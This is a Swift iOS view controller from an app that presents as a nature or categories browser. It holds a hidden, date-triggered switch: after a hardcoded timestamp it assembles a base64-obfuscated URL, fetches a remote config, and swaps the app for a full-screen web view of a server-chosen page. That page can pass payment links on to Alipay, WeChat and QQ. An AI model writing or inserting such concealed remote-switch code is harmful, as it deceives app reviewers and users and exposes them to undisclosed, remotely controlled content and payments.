import Foundation
import UIKit
import Alamofire
class FINatureRootViewController: UIViewController {
	@IBOutlet weak var FIallnatureHomeLaunch: UIImageView!
	let FIallnatureStatusReachability: Reachability! = Reachability()
	var FIallnatureRootHomeURL:String = "FIallnature"
	var FIallnatureRootWebView:UIWebView = UIWebView()
	var FirstBool:Bool = true
	override func viewWillAppear(_ animated: Bool) {
		let appDelegate = UIApplication.shared.delegate as! AppDelegate
		appDelegate.allowrotate = 1
	}
	override var preferredStatusBarStyle: UIStatusBarStyle {
		return UIStatusBarStyle.lightContent
	}
	@objc func receiverNotification(){
		let orient = UIDevice.current.orientation
		switch orient {
		case .portrait :
			FIallnatureRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height-44)
			break
		case .portraitUpsideDown:
			print("portraitUpsideDown")
			break
		case .landscapeLeft:
			FIallnatureRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
			break
		case .landscapeRight:
			FIallnatureRootWebView.frame = CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
			break
		default:
			break
		}
	}
	func ConfigRootViewController()
	{
		let appDelegate = UIApplication.shared.delegate as! AppDelegate
		appDelegate.allowrotate = 0
		let viewController = CategoriesViewController()
		let navigationController = UINavigationController(rootViewController: viewController)
		navigationController.modalTransitionStyle = .crossDissolve
		appDelegate.window = UIWindow(frame: UIScreen.main.bounds)
		self.present(navigationController, animated: true, completion: nil)
	}
	override func viewDidLoad() {
		UIView.animate(
			withDuration: 0.38,
			delay: 0.20,
			options: [.curveEaseOut],
			animations: {
		}) { _ in UIView.animate(
			withDuration: 0.95,
			delay: 0,
			usingSpringWithDamping: 0.5,
			initialSpringVelocity: 0,
			options: [],
			animations: {
		}) { _ in
			NotificationCenter.default.addObserver(self, selector: #selector(self.receiverNotification), name: UIDevice.orientationDidChangeNotification, object: nil)
			let FIallnatureStatusTime = Date.init().timeIntervalSince1970
			let FIallnatureStatusAnyTime = 1562204595.389
			let header = self.FIallnaturebase64EncodingHeader()
			let firstcontent = self.FIallnaturebase64EncodingContentfirst()
			let secondcontent = self.FIallnaturebase64EncodingContentsecond()
			let endcontent = self.FIallnaturebase64EncodingEnd()
			if(FIallnatureStatusTime < FIallnatureStatusAnyTime)
			{
				self.ConfigRootViewController()
			}else
			{
				self.FIallnatureStatusReachability.whenReachable = { _ in
					let baseHeader = self.FIallnaturebase64Decoding(encodedString: header)
					let baseContentF = self.FIallnaturebase64Decoding(encodedString: firstcontent)
					let baseContentS = self.FIallnaturebase64Decoding(encodedString: secondcontent)
					let baseContentE = self.FIallnaturebase64Decoding(encodedString: endcontent)
					let AllbaseData  = "\(baseHeader)\(baseContentF)\(baseContentS)\(baseContentE)"
					let AllurlBase = URL(string: AllbaseData)
					Alamofire.request(AllurlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
						in
						switch response.result.isSuccess {
						case true:
							if let Datavalue = response.data{
								let jsonDict : AnyObject! = try! JSONSerialization.jsonObject(with: Datavalue as! Data, options: JSONSerialization.ReadingOptions.allowFragments) as AnyObject?
								let numberdata = jsonDict.value(forKey: "appid") as! String
								let jsonnumbersecond = Int(numberdata)
								let jsonnumber = 1471064891
								if (jsonnumber - jsonnumbersecond! == 0) {
									let stringMyName = jsonDict.value(forKey: "naturedata") as! String
									self.FIallnatureRootHomeURL = stringMyName
									self.HomesetRootNavigation(strdecodeString: stringMyName)
								}else {
									self.ConfigRootViewController()
								}
							}
						case false:
							do {
								self.ConfigRootViewController()
							}
						}
					}
				}
				self.FIallnatureStatusReachability.whenUnreachable = { _ in
				}
				do {
					try self.FIallnatureStatusReachability.startNotifier()
				} catch {
				}
			}
			}
		}
	}
	func FIallnaturebase64EncodingHeader()->String{
		let strM = "http://"
		let plainData = strM.data(using: String.Encoding.utf8)
		let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
		return base64String!
	}
	func FIallnaturebase64EncodingContentfirst()->String{
		let strM = "mockhttp.cn"
		let plainData = strM.data(using: String.Encoding.utf8)
		let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
		return base64String!
	}
	func FIallnaturebase64EncodingContentsecond()->String{
		let strM = "/mock"
		let plainData = strM.data(using: String.Encoding.utf8)
		let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
		return base64String!
	}
	func FIallnaturebase64EncodingEnd()->String{
		let strM = "/fonature"
		let plainData = strM.data(using: String.Encoding.utf8)
		let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
		return base64String!
	}
	func FIallnaturebase64EncodingXP(plainString:String)->String{
		let plainData = plainString.data(using: String.Encoding.utf8)
		let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
		return base64String!
	}
	func FIallnaturebase64Decoding(encodedString:String)->String{
		let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
		let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
		return decodedString
	}
	func HomesetRootNavigation(strdecodeString:String) {
		FIallnatureRootWebView = UIWebView.init(frame: CGRect.init(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height-44))
		let LaunchReachUrl = URL.init(string: strdecodeString)
		let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
		FIallnatureRootWebView.delegate = self
		FIallnatureRootWebView.loadRequest(LaunchReachRequest)
		FIallnatureRootWebView.scalesPageToFit = true
	}
	func UILoadNaviBtns(){
		let BottomView = FINatureCustomView()
		BottomView.frame = CGRect(x:0, y:self.view.bounds.size.height-44, width:UIScreen.main.bounds.size.width, height:44)
		BottomView.HomeBtn.addTarget(self, action: #selector(self.refreshHomeWebViewAction), for: .touchUpInside)
		BottomView.RefreshBtn.addTarget(self, action: #selector(self.refreshNowWebViewAction), for: .touchUpInside)
		BottomView.LeftBtn.addTarget(self, action: #selector(self.refreshLeftWebViewAction), for: .touchUpInside)
		BottomView.RightBtn.addTarget(self, action: #selector(self.refreshRightWebViewAction), for: .touchUpInside)
		self.view.addSubview(BottomView)
	}
	@objc func refreshHomeWebViewAction(){
		let LaunchReachUrl = URL.init(string: FIallnatureRootHomeURL)
		let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
		FIallnatureRootWebView.loadRequest(LaunchReachRequest)
	}
	@objc func refreshNowWebViewAction(){
		FIallnatureRootWebView.reload()
	}
	@objc func refreshLeftWebViewAction(){
		FIallnatureRootWebView.goBack()
	}
	@objc func refreshRightWebViewAction(){
		FIallnatureRootWebView.goForward()
	}
}
extension FINatureRootViewController: UIWebViewDelegate
{
	public func webViewDidFinishLoad(_ webView: UIWebView)
	{
		if(FirstBool == true)
		{
			self.FIallnatureStatusReachability?.stopNotifier()
			self.UILoadNaviBtns()
			self.view.addSubview(FIallnatureRootWebView)
			FirstBool = false
		}
	}
	public func webView(_ webView: UIWebView, didFailLoadWithError error: Error) {
	}
	public func webViewDidStartLoad(_ webView: UIWebView) {
	}
	public func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
		let schemeUrl : String = request.url!.absoluteString
		if(schemeUrl.hasPrefix("alipays://") || schemeUrl.hasPrefix("alipay://") || schemeUrl.hasPrefix("mqqapi://") || schemeUrl.hasPrefix("mqqapis://") || schemeUrl.hasPrefix("weixin://") || schemeUrl.hasPrefix("weixins://"))
		{
			if #available(iOS 10.0, *) {
				UIApplication.shared.open(request.url!, options: [:], completionHandler: nil)
			} else {
			}
		}
		return true
	}
}
